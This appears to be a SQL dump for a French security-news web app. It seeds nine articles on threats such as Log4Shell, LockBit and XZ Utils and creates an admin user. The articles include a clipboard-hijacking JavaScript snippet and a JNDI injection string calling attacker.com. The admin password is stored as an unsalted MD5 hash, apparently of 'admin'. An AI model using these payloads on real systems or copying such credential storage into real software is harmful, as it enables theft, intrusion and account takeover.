SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données :  `SecurityNews`
--

-- --------------------------------------------------------

--
-- Structure de la table `articles`
--

CREATE TABLE `articles` (
  `id` int(4) NOT NULL,
  `titre` varchar(50) NOT NULL,
  `auteur` varchar(20) NOT NULL,
  `texte` text NOT NULL,
  `date` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Contenu de la table `articles`
--

INSERT INTO `articles` (`id`, `titre`, `auteur`, `texte`, `date`) VALUES
(1, 'Copy Fail', 'Jack', 'Copy Fail est un outil de démonstration des attaques par détournement de presse-papier (clipboard hijacking).\r\n\r\nPrincipe : un script malveillant surveille le contenu copié par l\'utilisateur et le remplace à la volée. Cas d\'usage courants chez les attaquants :\r\n- Remplacement d\'adresses de portefeuilles crypto lors d\'un copier-coller\r\n- Substitution de commandes shell (ex : sudo apt install → commande malveillante)\r\n- Modification silencieuse d\'IBANs dans les formulaires de virement\r\n\r\nEn JavaScript, l\'événement copy permet d\'intercepter et modifier la sélection :\ndocument.addEventListener(\'copy\', function(e) {\n  e.clipboardData.setData(\'text/plain\', \'PAYLOAD\');\n  e.preventDefault();\n});\r\n\r\nProtection : désactiver JavaScript pour les sites non fiables, vérifier le contenu collé avant validation.', '2024-02-14'),
(2, 'Blue Hammer', 'Alexis', 'Blue Hammer est un framework d\'attaque développé pour les tests d\'intrusion sur les infrastructures Windows Active Directory.\r\n\r\nFonctionnalités principales :\r\n- Énumération automatisée des utilisateurs, groupes et GPO\r\n- Attaques Kerberoasting et AS-REP Roasting\r\n- Pass-the-Hash et Pass-the-Ticket\r\n- Mouvement latéral via WMI et PSExec\r\n- Génération de rapports au format HTML\r\n\r\nUsage typique en pentest interne :\r\nbluehammer --target 192.168.1.0/24 --dc 192.168.1.10 --module enum\r\n\r\nBlue Hammer est à usage strictement éducatif et légal dans le cadre d\'audits autorisés.', '2024-04-03'),
(3, 'Nginx - Vulnérabilité off-by-one (CVE-2021-23017)', 'Florian', 'CVE-2021-23017 est une vulnérabilité de type off-by-one dans le résolveur DNS de nginx, affectant les versions 0.6.18 à 1.20.0.\r\n\r\nConditions d\'exploitation :\r\n- nginx doit être configuré avec un resolver actif\r\n- L\'attaquant doit être en mesure de forger une réponse DNS (Man-in-the-Middle ou serveur DNS malveillant)\r\n\r\nImpact : corruption mémoire pouvant mener à un crash du processus worker ou, dans des conditions précises, à une exécution de code arbitraire (RCE).\r\n\r\nCorrection : mettre à jour nginx vers la version 1.20.1 ou 1.21.0+.\r\n\r\nVérifier la version installée :\nnginx -v\r\n\r\nSource : https://nginx.org/en/security_advisories.html', '2021-06-01'),
(4, 'Log4Shell – CVE-2021-44228', 'Florian', 'La vulnérabilité Log4Shell affecte la bibliothèque Java Log4j 2 et permet une exécution de code à distance (RCE) sans authentification.\r\n\r\nUn attaquant peut déclencher l\'exploitation en injectant une chaîne de type ${jndi:ldap://attacker.com/a} dans n\'importe quel champ loggué par l\'application.\r\n\r\nRecommandations :\r\n- Mettre à jour Log4j vers la version 2.17.1 ou supérieure\r\n- Désactiver les lookups JNDI via log4j2.formatMsgNoLookups=true\r\n- Appliquer des règles WAF pour bloquer les payloads JNDI', '2021-12-12'),
(5, 'Ransomware LockBit 3.0', 'Alexis', 'LockBit 3.0 (aussi appelé LockBit Black) est apparu en juin 2022. Il s\'agit du ransomware-as-a-service (RaaS) le plus actif de 2022-2023.\r\n\r\nCaractéristiques :\r\n- Chiffrement ultra-rapide via multithreading\r\n- Exfiltration des données avant chiffrement (double extorsion)\r\n- Programme de bug bounty officiel annoncé par le groupe\r\n- Panneau d\'administration web pour les affiliés\r\n\r\nVecteurs d\'entrée courants : RDP exposé, phishing, exploitation de VPN vulnérables (Fortinet, Citrix).', '2022-07-15'),
(6, 'ChatGPT et ingénierie sociale', 'Jack', 'Les LLM comme ChatGPT sont de plus en plus utilisés pour automatiser et améliorer les attaques de phishing.\r\n\r\nUsages malveillants observés :\r\n- Génération de mails de phishing sans fautes d\'orthographe\r\n- Personnalisation à grande échelle (spear phishing)\r\n- Création de faux profils crédibles sur les réseaux sociaux\r\n- Aide à l\'écriture de scripts malveillants pour débutants\r\n\r\nRéférences :\r\nhttps://www.ncsc.gov.uk/report/impact-of-ai-on-cyber-threat\r\nhttps://www.europol.europa.eu/cms/sites/default/files/documents/Tech_Watch_Flash_ChatGPT.pdf', '2023-03-22'),
(7, 'CVSS 4.0 – Nouveau standard', 'Florian', 'Le CVSS (Common Vulnerability Scoring System) version 4.0 a été publié par le FIRST en novembre 2023.\r\n\r\nPrincipaux changements par rapport au CVSS 3.1 :\r\n- Nouvelle nomenclature : Base, Threat, Environmental, Supplemental\r\n- Meilleure granularité pour les systèmes OT/ICS et IoT\r\n- Suppression du score Temporal, remplacé par Threat\r\n- Nouveaux paramètres : Safety, Automatable, Recovery\r\n\r\nLien officiel : https://www.first.org/cvss/v4.0/specification-document', '2023-11-08'),
(8, 'Attaque supply chain XZ Utils', 'Alexis', 'En mars 2024, une backdoor a été découverte dans XZ Utils (versions 5.6.0 et 5.6.1), une bibliothèque de compression présente dans de nombreuses distributions Linux.\r\n\r\nL\'attaque, référencée CVE-2024-3094, est le fruit d\'un effort d\'ingénierie sociale de plusieurs années : l\'attaquant (alias JiaT75) a gagné la confiance des mainteneurs du projet avant d\'introduire le code malveillant.\r\n\r\nImpact : la backdoor ciblait sshd via systemd sur les distributions utilisant glibc, permettant potentiellement un accès root à distance.\r\n\r\nDécouverte par Andres Freund (Microsoft) de manière fortuite.', '2024-03-30'),
(9, 'Windows BitLocker – Contournement 2024', 'Jack', 'CVE-2024-20666 : une vulnérabilité dans BitLocker permet à un attaquant ayant un accès physique de contourner le chiffrement au démarrage.\r\n\r\nConditions d\'exploitation :\r\n- Accès physique à la machine\r\n- Environnement de récupération Windows (WinRE) non patché\r\n\r\nMicrosoft a corrigé cette faille dans le Patch Tuesday de janvier 2024. Il est recommandé de vérifier que WinRE est bien mis à jour via la commande :\r\nmanage-bde -status\r\n\r\nSource : https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20666', '2024-01-09');

--
-- Index pour les tables exportées
--

--
-- Index pour la table `articles`
--
ALTER TABLE `articles`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT pour les tables exportées
--

--
-- AUTO_INCREMENT pour la table `articles`
--
ALTER TABLE `articles`
  MODIFY `id` int(4) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

-- --------------------------------------------------------

--
-- Structure de la table `users`
--

CREATE TABLE `users` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `user` varchar(50) NOT NULL,
  `password` varchar(32) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Contenu de la table `users`
--

INSERT INTO `users` (`user`, `password`) VALUES
('admin', '21232f297a57a5a743894a0e4a801fc3');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
